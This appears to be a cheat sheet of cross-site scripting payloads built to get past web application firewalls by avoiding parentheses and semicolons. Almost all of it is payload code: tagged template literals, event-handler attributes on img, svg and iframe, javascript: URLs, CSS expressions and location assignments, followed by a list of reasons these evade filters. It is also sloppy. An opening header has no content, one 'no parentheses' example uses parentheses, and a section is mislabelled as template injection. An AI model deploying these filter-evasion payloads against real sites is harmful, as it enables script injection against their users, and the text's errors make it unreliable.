about the WAF
WAF Request Processing Steps:

## XSS Without Parentheses and Semicolons

### 1. Using Template Literals and Tagged Templates
```javascript
// Using template literal with alert
`${alert`1`}`

// Using tagged template functions
alert`XSS`
eval`alert\`1\``
setTimeout`alert\`XSS\``
```

### 2. Using Bracket Notation and Array Methods
```javascript
// Using bracket notation instead of parentheses
window['alert']['call'](null, 'XSS')
[]['constructor']['constructor']`alert\`1\``

// Using array methods
[].map.call`${alert`1`}`
```

### 3. Using Event Handlers
```html
<!-- No parentheses needed in event handlers -->
<img src=x onerror=alert`1`>
<svg onload=alert`XSS`>
<body onload=alert`1`>
<iframe onload=alert`XSS`>
```

### 4. Using JavaScript URL Scheme
```html
<a href="javascript:alert`XSS`">Click</a>
<iframe src="javascript:alert`1`">
```

### 5. Using CSS and Expressions (IE)
```html
<div style="width:expression(alert`XSS`)">
<style>@import javascript:alert`XSS`</style>
```

### 6. Using DOM Properties
```javascript
// Setting innerHTML without parentheses
document.body.innerHTML = `<img src=x onerror=alert\`1\`>`

// Using location object
location = `javascript:alert\`XSS\``
location.href = `javascript:alert\`1\``
```

### 7. Advanced Template String Techniques
```javascript
// Using String.raw
String.raw`${alert`1`}`

// Combining with destructuring
let {alert} = window
alert`XSS`

// Using computed property names
window[`al${''}ert`]`1`
```

### 8. WAF Bypass Examples
```html
<!-- Traditional blocked payload -->
<script>alert(1);</script>

<!-- Bypass without parentheses/semicolons -->
<script>alert`1`</script>
<img src=x onerror=alert`XSS`>
<svg onload=location=`javascript:alert\`1\``>
<iframe src=javascript:alert`XSS`>
```

### 9. Server-Side Template Injection (SSTI) Style
```javascript
// Using template literals for code execution
`${eval`alert\`1\``}`
`${Function`alert\`XSS\``()}`
`${constructor.constructor`alert\`1\``()}`
```

### Why This Bypasses WAFs:
- **Pattern Matching**: WAFs look for `alert()` and `alert();` patterns
- **Template Literals**: Backticks aren't commonly filtered
- **Tagged Templates**: Lesser-known JavaScript feature
- **Event Context**: Event handlers have different parsing rules
- **URL Context**: JavaScript URLs execute differently





